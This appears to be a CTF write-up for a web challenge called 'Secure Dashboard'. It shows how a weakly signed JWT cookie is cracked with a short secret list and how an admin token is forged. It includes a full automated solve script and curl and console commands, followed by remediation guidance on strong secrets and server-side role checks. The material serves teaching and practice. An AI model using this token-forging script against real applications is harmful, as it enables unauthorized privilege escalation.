---
title: "Write Up – Secure Dashboard"
description: "Migrated from database"
year: 2026
category: "CTF"
techStack: "JWT, WebExploit, SessionAdmin, JSON"
githubUrl: "-"
demoUrl: "-"
coverUrl: "/uploads/cover_1769493817973_0e2f4c3fa186c.png"
createdAt: "2026-01-27T06:03:38.026Z"
updatedAt: "2026-01-27T06:03:38.026Z"
---

# Write Up – Secure Dashboard

# Write Up – Secure Dashboard

## Challenge Overview
**Category:** Web  
**Difficulty:** Easy  
**Points:** 100  
**Author:** aria

Aplikasi ini mempercayai cookie lebih dari yang seharusnya. Kamu hanyalah user biasa… atau setidaknya, untuk sekarang.

**Target URL:** https://aria.my.id/7/admin.php  
**Hint:** JWT

Format flag:
```
FGTE{...}
```

---

## Given Information

### Target Website
- **URL:** https://aria.my.id/7/admin.php
- **Authentication:** JWT-based (HS256 algorithm)
- **Current User:** guest
- **Current Role:** user
- **Goal:** Access admin dashboard to get flag

### Initial Observation

**Landing Page shows:**
```html
<h4>Secure Dashboard</h4>
<div>JWT-based authentication (HS256)</div>

<div class="alert alert-info">
  <strong>User Dashboard</strong>
  <div>Selamat datang, <b>guest</b></div>
</div>

<p>Role kamu saat ini: <b>user</b></p>
<p>Coba klik menu <em>Admin</em> untuk menguji akses.</p>
```

**Navigation buttons:**
- Dashboard (`?page=dashboard`)
- Admin (`?page=admin`)

### Challenge Hint Analysis
> "Aplikasi ini **mempercayai cookie lebih dari yang seharusnya**."

**Key Insights:**
1. ✅ Application trusts cookie content (JWT) without proper validation
2. ✅ JWT stored in cookie for authentication
3. ✅ "Untuk sekarang" → Implies we can change our status
4. ✅ Hint: "JWT" → Focus on JWT manipulation

---

## Key Insights

### 1. JWT Authentication Implementation

When accessing the page, server sets a JWT cookie:

**Cookie name:** `token`  
**Cookie value:** JWT token with user information

**JWT Structure:**
```
Header.Payload.Signature
```

### 2. The Vulnerability

**Weak JWT Secret + Role-Based Access Control**

The application:
- Uses JWT for authentication
- Stores role information in JWT payload
- Uses a weak, predictable secret to sign tokens
- Trusts the JWT payload without additional server-side validation

**Attack Vector:**
If we can crack the JWT secret, we can:
1. Decode the current JWT
2. Modify the role from `"user"` to `"admin"`
3. Re-sign with the same secret
4. Replace cookie → Gain admin access

---

## Solution Steps

### Step 1 – Reconnaissance & Cookie Extraction

**Access the target page:**
```bash
curl -c cookies.txt https://aria.my.id/7/admin.php
```

**Or in browser:**
1. Open https://aria.my.id/7/admin.php
2. Press F12 → Application → Cookies
3. Find cookie named `token`

**JWT Token found:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.wYhXjKk6jfe2_4i5lyy0Tyrl4TM37XB-XSgXtSpXXgw
```

### Step 2 – JWT Analysis

**Decode JWT (without signature verification):**

**Method 1: Using jwt.io**
```
Visit: https://jwt.io
Paste token in "Encoded" section
View decoded payload
```

**Method 2: Using Python**
```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.wYhXjKk6jfe2_4i5lyy0Tyrl4TM37XB-XSgXtSpXXgw"

# Decode without verification
payload = jwt.decode(token, options={"verify_signature": False})
print(payload)
```

**Decoded JWT:**

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "username": "guest",
  "role": "user"
}
```

✅ **Key Finding:** Role is stored in JWT payload! If we can modify and re-sign, we become admin.

### Step 3 – Secret Cracking (Weak Secret Brute Force)

**Using automated script:**
```python
#!/usr/bin/env python3
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.wYhXjKk6jfe2_4i5lyy0Tyrl4TM37XB-XSgXtSpXXgw"

# Common weak secrets
secrets = [
    'secret', 'Secret', 'SECRET', 'password', 
    'admin', 'key', '123456', 'jwt_secret'
]

for secret in secrets:
    try:
        # Try to verify token with this secret
        jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] Found secret: '{secret}'")
        break
    except jwt.InvalidSignatureError:
        continue
```

**Output:**
```
[+] ✓ Found secret: 'secret'
```

✅ **Secret cracked:** `secret` (extremely weak!)

### Step 4 – Forging Admin JWT

**Create modified payload with admin role:**

```python
import jwt

# The cracked secret
secret = "secret"

# Create admin payload
admin_payload = {
    "username": "admin",
    "role": "admin"
}

# Generate new JWT with admin privileges
admin_token = jwt.encode(admin_payload, secret, algorithm="HS256")

print(f"Admin Token: {admin_token}")
```

**Generated Admin Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0._8exKepVtGt64GYgSb71H2GiacV9S7iVOdTmk5mQsB4
```

**Decoded Admin Token:**

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "username": "admin",  ← Changed from "guest"
  "role": "admin"       ← Changed from "user"
}
```

**Signature:** Valid (signed with same secret `"secret"`)

### Step 5 – Cookie Replacement & Exploitation

**Method 1: Browser Console (USED)**

**Open browser and navigate to:**
```
https://aria.my.id/7/admin.php
```

**Open DevTools (F12) → Console tab**

**Execute this command:**
```javascript
document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0._8exKepVtGt64GYgSb71H2GiacV9S7iVOdTmk5mQsB4; path=/";
location.href = "?page=admin";
```

**What this does:**
1. Sets `token` cookie with our forged admin JWT
2. Redirects to `/admin.php?page=admin`
3. Server validates JWT signature (✓ valid with secret "secret")
4. Server reads role from payload (✓ role is "admin")
5. Grants admin access!

**Method 2: Manual Cookie Editing**
1. F12 → Application → Cookies
2. Find `token` cookie
3. Replace value with admin token
4. Navigate to `?page=admin`

**Method 3: Using curl**
```bash
curl -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0._8exKepVtGt64GYgSb71H2GiacV9S7iVOdTmk5mQsB4" \
     "https://aria.my.id/7/admin.php?page=admin"
```

### Step 6 – Access Granted & Flag Obtained

**Admin Dashboard Response:**
```html
<h4>Secure Dashboard</h4>
<div>JWT-based authentication (HS256)</div>

<div class="alert alert-success">
  <strong>Anda adalah admin</strong>
</div>

<div>
  <h5>Admin Dashboard</h5>
  <div>Selamat datang, admin</div>
</div>

<p><strong>Flag: FGTE{jwt_cookie_role_forgery}</strong></p>
```

✅ **Flag obtained:** `FGTE{jwt_cookie_role_forgery}`

---

## Complete Automated Solve Script

```python
#!/usr/bin/env python3
"""
Secure Dashboard - Complete JWT Exploitation
"""
import requests
import jwt
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def solve_secure_dashboard():
    """Automated JWT exploitation"""
    
    target = "https://aria.my.id/7/admin.php"
    
    print("[*] Step 1: Getting initial JWT...")
    session = requests.Session()
    session.verify = False
    
    resp = session.get(target)
    
    # Extract JWT from cookies
    jwt_token = None
    for cookie in session.cookies:
        if cookie.name == 'token':
            jwt_token = cookie.value
            break
    
    if not jwt_token:
        print("[-] No JWT found!")
        return
    
    print(f"[+] JWT Token: {jwt_token[:50]}...")
    
    # Step 2: Decode JWT
    print("\n[*] Step 2: Decoding JWT...")
    payload = jwt.decode(jwt_token, options={"verify_signature": False})
    print(f"[+] Current payload: {payload}")
    
    # Step 3: Crack secret
    print("\n[*] Step 3: Cracking JWT secret...")
    secrets = ['secret', 'Secret', 'password', 'admin', 'key']
    
    cracked_secret = None
    for secret in secrets:
        try:
            jwt.decode(jwt_token, secret, algorithms=["HS256"])
            cracked_secret = secret
            print(f"[+] ✓ Found secret: '{secret}'")
            break
        except:
            continue
    
    if not cracked_secret:
        print("[-] Could not crack secret")
        return
    
    # Step 4: Create admin token
    print("\n[*] Step 4: Creating admin token...")
    admin_payload = {
        "username": "admin",
        "role": "admin"
    }
    
    admin_token = jwt.encode(admin_payload, cracked_secret, algorithm="HS256")
    print(f"[+] Admin token: {admin_token[:50]}...")
    
    # Step 5: Test admin access
    print("\n[*] Step 5: Testing admin access...")
    session.cookies.set('token', admin_token)
    
    resp = session.get(target + "?page=admin")
    
    # Extract flag
    flag_match = re.search(r'FGTE\{[^}]+\}', resp.text)
    
    if flag_match:
        flag = flag_match.group(0)
        print("\n" + "="*60)
        print(f"[★★★] SUCCESS!")
        print(f"[★★★] FLAG: {flag}")
        print("="*60)
        return flag
    else:
        print("[-] No flag found")
        return None

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║         Secure Dashboard - Auto Solver                   ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    solve_secure_dashboard()
```

**Run script:**
```bash
python3 solve_dashboard.py
```

**Output:**
```
[*] Step 1: Getting initial JWT...
[+] JWT Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFt...

[*] Step 2: Decoding JWT...
[+] Current payload: {'username': 'guest', 'role': 'user'}

[*] Step 3: Cracking JWT secret...
[+] ✓ Found secret: 'secret'

[*] Step 4: Creating admin token...
[+] Admin token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFt...

[*] Step 5: Testing admin access...

============================================================
[★★★] SUCCESS!
[★★★] FLAG: FGTE{jwt_cookie_role_forgery}
============================================================
```

---

## Detailed Walkthrough

### Understanding JWT

**JWT (JSON Web Token) consists of three parts:**

```
Header.Payload.Signature
```

**Example:**
```
eyJhbGc...  .  eyJ1c2Vy...  .  wYhXjKk6...
   ↑             ↑              ↑
 Header        Payload       Signature
```

**Header (Base64 encoded):**
```json
{
  "alg": "HS256",    // Algorithm used
  "typ": "JWT"       // Token type
}
```

**Payload (Base64 encoded):**
```json
{
  "username": "guest",
  "role": "user"
}
```

**Signature:**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

### The Vulnerability Chain

**1. Weak Secret**
```
Secret: "secret"
↓
Easily crackable with wordlist
↓
Attacker can sign arbitrary tokens
```

**2. Client-Side Trust**
```
JWT in cookie
↓
Server reads role from JWT payload
↓
No server-side user validation
↓
Complete trust in JWT content
```

**3. Role-Based Access Control**
```
if (jwt.role === "admin") {
    // Grant admin access
}
```

**Attack Flow:**
```
1. Get original JWT with role="user"
2. Crack JWT secret
3. Create new JWT with role="admin"
4. Sign with cracked secret
5. Replace cookie
6. Server validates signature (✓)
7. Server trusts role="admin" (✗)
8. Admin access granted!
```

### Why This Works

**Server validation (vulnerable):**
```javascript
// Pseudocode
const token = getCookie('token');
const decoded = jwt.verify(token, SECRET);  // Validates signature

if (decoded.role === 'admin') {
    // Grant admin access
    showAdminDashboard();
}
```

**What's wrong:**
- ✅ Signature verification (good)
- ❌ Trusts payload content blindly (bad)
- ❌ No database lookup to verify user
- ❌ Weak secret makes signature verification pointless

**Proper implementation:**
```javascript
const token = getCookie('token');
const decoded = jwt.verify(token, STRONG_SECRET);

// Don't trust JWT payload!
const user = database.getUserById(decoded.userId);

if (!user || user.role !== 'admin') {
    return unauthorized();
}

showAdminDashboard();
```

---

## Security Analysis

### Vulnerabilities Identified

**1. Weak JWT Secret (CRITICAL)**
- **Type:** CWE-521 - Weak Password Requirements
- **OWASP:** A02:2021 – Cryptographic Failures
- **Impact:** Complete authentication bypass
- **Secret used:** `"secret"` (5 characters, dictionary word)
- **Fix:** Use cryptographically random secret (32+ bytes)

**2. Insufficient Server-Side Validation**
- **Type:** CWE-602 - Client-Side Enforcement of Server-Side Security
- **OWASP:** A01:2021 – Broken Access Control
- **Impact:** Role manipulation, privilege escalation
- **Fix:** Validate user role against database, don't trust JWT payload

**3. Predictable Token Structure**
- **Type:** Information Disclosure
- **Impact:** Easy to understand and manipulate
- **Fix:** Use opaque tokens or add additional claims

### Attack Complexity

**Time to Exploit:** < 5 minutes  
**Required Skills:** Basic JWT knowledge, Python scripting  
**Tools Required:** Browser DevTools OR curl + Python

**Attack Steps:**
1. Extract JWT (5 seconds)
2. Decode JWT (5 seconds)
3. Crack secret (1 second with "secret")
4. Generate admin token (5 seconds)
5. Replace cookie (5 seconds)
6. Get flag (instant)

---

## Proper Security Implementation

### ✅ Secure JWT Implementation

**1. Strong Secret Generation**
```bash
# Generate strong random secret
openssl rand -base64 64

# Output example:
# 8X/A!kN...vY2w== (88 characters)
```

**2. Server-Side Validation**
```javascript
const jwt = require('jsonwebtoken');
const db = require('./database');

async function validateAdmin(token) {
    try {
        // 1. Verify signature
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        
        // 2. Validate against database (don't trust JWT!)
        const user = await db.getUserById(decoded.userId);
        
        if (!user) {
            throw new Error('User not found');
        }
        
        // 3. Check actual role from database
        if (user.role !== 'admin') {
            throw new Error('Insufficient privileges');
        }
        
        // 4. Check token expiration
        if (decoded.exp < Date.now() / 1000) {
            throw new Error('Token expired');
        }
        
        return user;
        
    } catch (error) {
        throw new Error('Unauthorized');
    }
}
```

**3. Additional Security Measures**
```javascript
// Add expiration
const payload = {
    userId: user.id,
    username: user.username,
    exp: Math.floor(Date.now() / 1000) + (60 * 60),  // 1 hour
    iat: Math.floor(Date.now() / 1000),              // Issued at
    jti: uuid.v4()                                    // Unique ID
};

// Don't store sensitive info in payload
// ❌ Don't: { password: "...", ssn: "..." }
// ✅ Do: { userId: 123, sessionId: "..." }
```

**4. Use RS256 Instead of HS256**
```javascript
// RS256 uses public/private key pair
// More secure than shared secret

// Generate keys
// openssl genrsa -out private.key 2048
// openssl rsa -in private.key -pubout > public.key

// Sign with private key
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });

// Verify with public key
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

### ✅ Defense in Depth

**Layer 1: Strong Secrets**
- Minimum 256 bits (32 bytes)
- Cryptographically random
- Stored securely (environment variables, secrets manager)
- Rotated periodically

**Layer 2: Token Validation**
- Verify signature
- Check expiration
- Validate claims
- Check token revocation list

**Layer 3: Server-Side Authorization**
- Database lookup for every request
- Don't trust client data
- Implement proper RBAC
- Log access attempts

**Layer 4: Additional Controls**
- Rate limiting
- IP whitelisting (if applicable)
- MFA for admin access
- Session management

---

## Flag
```
FGTE{jwt_cookie_role_forgery}
```

---

## Conclusion

This challenge demonstrates a **critical vulnerability in JWT implementation**:

### What We Learned

**Technical Concepts:**
- ✅ JWT structure and how it works
- ✅ HS256 symmetric signing
- ✅ Weak secret exploitation
- ✅ Role-based access control bypass
- ✅ Cookie manipulation

**Security Principles:**
- ❌ **Never trust client data** - JWT payload can be modified
- ❌ **Weak secrets = no security** - "secret" is useless
- ❌ **Client-side checks fail** - Always validate server-side
- ✅ **Defense in depth** - Multiple layers of security
- ✅ **Principle of least privilege** - Don't store sensitive data in JWT

### Real-World Impact

**In Production:**
- 🚨 Complete authentication bypass
- 🚨 Privilege escalation to admin
- 🚨 Unauthorized data access
- 🚨 System compromise

**This vulnerability has occurred in:**
- Major e-commerce platforms
- Banking applications
- Government systems
- Enterprise software

### Key Takeaways

**For Defenders:**
1. **Use strong secrets** - Minimum 256 bits, random
2. **Validate server-side** - Don't trust JWT payload
3. **Add expiration** - Short-lived tokens
4. **Consider RS256** - Asymmetric is more secure
5. **Monitor & log** - Detect suspicious activity

**For CTF Players:**
1. **Check for JWT** - Look for tokens in cookies/headers
2. **Try weak secrets** - "secret", "password", etc.
3. **Decode payload** - Understand the structure
4. **Forge tokens** - Modify and re-sign
5. **Test 'none' algorithm** - Common vulnerability

> **The Lesson:** Security is only as strong as its weakest link. In this case, using "secret" as a JWT secret is equivalent to having no security at all. Always use strong, cryptographically random secrets and never trust client-provided data without server-side validation.

---

## Tools Used

- **Browser DevTools** - Cookie inspection and modification
- **Python + PyJWT** - JWT decoding and encoding
- **jwt.io** - Online JWT debugger (optional)
- **curl** - HTTP requests (optional)

---

## References

- **JWT.io** - https://jwt.io
- **RFC 7519 (JWT)** - https://tools.ietf.org/html/rfc7519
- **OWASP JWT Cheat Sheet** - https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- **CWE-521** - https://cwe.mitre.org/data/definitions/521.html
- **PyJWT Documentation** - https://pyjwt.readthedocs.io/

---

**Author:** [Your Name]  
**Date:** January 27, 2026  
**Challenge:** Secure Dashboard (100 points)  
**Category:** Web - JWT Authentication Bypass
